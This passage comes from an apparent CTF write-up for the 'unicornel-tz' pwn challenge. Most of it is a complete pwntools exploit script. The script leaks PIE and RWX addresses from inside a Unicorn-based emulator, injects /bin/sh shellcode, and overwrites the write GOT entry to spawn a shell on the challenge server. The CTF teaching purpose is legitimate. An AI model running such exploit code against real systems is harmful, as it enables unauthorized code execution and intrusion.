</span></span><span class="line"><span class="cl"><span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_base</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rwx_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rwx_base</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="https://i.imgur.com/621aiYg.png"/>
<p>Above is the result of our execution. As we can see, <code>r10</code> and <code>r11</code> now contain the base RWX and base PIE addresses respectively (we already subtracted the leaked value with the offset to its own base in the shellcode). Now that we have both the base RWX and PIE addresses in hand, we can move to the next step, which is gaining RCE in the app.</p>
<h4 id="gain-remote-code-execution">Gain Remote Code Execution</h4>
<p>If you run <code>checksec</code> on the app, you&rsquo;ll see that the binary protection is actually only <code>Partial RELRO</code> 🙂.</p>
<img src="https://i.imgur.com/HeJlncM.png"/>
<p>This means we can simply overwrite the GOT of the app to gain RCE. To recap, up to this point, we already have:</p>
<ul>
<li>A pointer to RWX in <code>r10</code></li>
<li>A pointer to PIE in <code>r11</code></li>
</ul>
<p>My idea is pretty simple, inject shellcode into the RWX area, then place its address in the <code>write</code> GOT area. When we trigger the <code>unicornel_write</code> syscall (which calls <code>write</code> in the process), our shellcode will be executed by the host process. Here&rsquo;s the high-level plan:</p>
<ul>
<li>Create shellcode to put in the <code>trustzone</code> that will overwrite the RWX area. This shellcode will:
<ul>
<li>Call <code>map_address</code> to map the RWX area to our emulated process space</li>
<li>Write our shellcode into it</li>
</ul>
</li>
<li>Create shellcode to put in the <code>trustzone</code> that will overwrite the GOT. This shellcode will:
<ul>
<li>Call <code>map_address</code> to map the GOT area to our emulated process space</li>
<li>Overwrite the <code>write</code> GOT entry with our shellcode address</li>
</ul>
</li>
<li>Simply call the <code>unicornel_write</code> syscall to spawn the shell</li>
</ul>
<p>Below is the full exploit script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unicorn</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span>        <span class="o">=</span> <span class="s1">&#39;./chal&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s1">&#39;unicornel-tz.2025.ctfcompetition.com&#39;</span><span class="p">,</span> <span class="mi">1337</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># return process(exe)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">devnull</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">.intel_syntax noprefix
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_shared */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 3
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80 # Handle 0 will be created
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;memprot_x86_64&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + memprot_x86_64]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Invoke memprot to map trustzone with RWX permissions */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0x7
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rdi, [rip + password_str]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to leak shared_buffers[0].buffer address */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+leak_shared_buffers_0]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+leak_shared_buffers_0_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will print ptr) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to leak PIE and RWX address */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+leak_pie_and_rwx]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+leak_pie_and_rwx_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to map RWX address and fill with our shellcode */
</span></span></span><span class="line"><span class="cl"><span class="s1">add r10, 0x444400 # We plan to inject shellcode in the rwx+0x44000 area
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+fill_rwx]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+fill_rwx_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to map PIE and overwrite GOT of write */
</span></span></span><span class="line"><span class="cl"><span class="s1">add r11, 0x120c050 # We plan to overwrite the GOT, so just simply allocate on it directly
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+fill_pie]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+fill_pie_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Spawn shell by trigger write */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x8000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x1
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x1
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Pause so that we can debug */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x6
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_shared_buffers_0:
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Call validate_handle 0 */
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rbx, rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rcx, rcx
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 4
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, rax # store leaked value at r12
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Print leak for debugging purposes */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, rax
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_shared_buffers_0_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_pie_and_rwx:
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Call map_address */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x5000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx, 0x2000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdx, r12 # r12 is shared_buffers[0]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub rdx, 0x12bf0 # map to the base of area instead of to the shared_buffers[0]
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 5
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Store leaked pie at r11 and leaked rwx at r10 */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x5000
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rbx, 0x1100
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r11, qword ptr [rbx]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r11, 0x785b20 # r11 = PIE BASE
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x5000
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rbx, 0x0b88
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r10, qword ptr [rbx]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r10, 0x1c2f # r10 = RWX BASE
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Print for debugging purposes */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, r11
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, r10
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_pie_and_rwx_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">fill_rwx:
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Call map_address */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x7000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdx, r10 # r10 = rwx address
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 5
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Fill shellcode to rwx */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, 0x7000
</span></span></span><span class="line"><span class="cl"><span class="s1">    lea rsi, [rip+sc]
</span></span></span><span class="line"><span class="cl"><span class="s1">    lea rcx, [rip+sc_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">    rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">    sc:
</span></span></span><span class="line"><span class="cl"><span class="s1">        lea rdi, [rip+binsh_str]
</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rsi, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rdx, rdx
</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 0x3b
</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">        binsh_str:
</span></span></span><span class="line"><span class="cl"><span class="s1">            .ascii &#34;/bin/sh\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">    sc_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">fill_rwx_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">fill_pie:
</span></span></span><span class="line"><span class="cl"><span class="s1">     /* Call map_address */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x8000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdx, r11 # r11 = write GOT address
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 5
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Overwrite &#34;write&#34; GOT with the shellcode address */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov qword ptr [rbx], r10
</span></span></span><span class="line"><span class="cl"><span class="s1">fill_pie_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">password_str:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;sup3r_s3cure_sj\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">memprot_x86_64:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;memprot_x86_64\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;run the solver with:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; solve &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pow_chall</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pow_chall</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pow_sol</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;python3 kctf-pow.py solve </span><span class="si">{</span><span class="n">pow_chall</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pow_sol</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Solution? &#39;</span><span class="p">,</span> <span class="n">pow_sol</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">CODE</span> <span class="o">=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">VA</span><span class="p">,</span> <span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl"><span class="n">hdr</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">unicorn</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">unicorn</span><span class="o">.</span><span class="n">UC_MODE_64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">VA</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">SIZE</span><span class="p">),</span>          <span class="c1"># one RX page for code+data</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span>              <span class="c1"># unused maps</span>
</span></span><span class="line"><span class="cl">    <span class="n">p16</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">CODE</span><span class="p">)),</span>              <span class="c1"># code_length</span>
</span></span><span class="line"><span class="cl">    <span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                        <span class="c1"># num_maps</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;DATA_START&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">hdr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CODE_START&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">CODE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pid 0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_addr</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_base</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rwx_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rwx_base</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="https://i.imgur.com/CB7kQHG.png"/>
As you can see in the above image, we finally able to spawn a shell and fetch the flag 🙂
<blockquote>
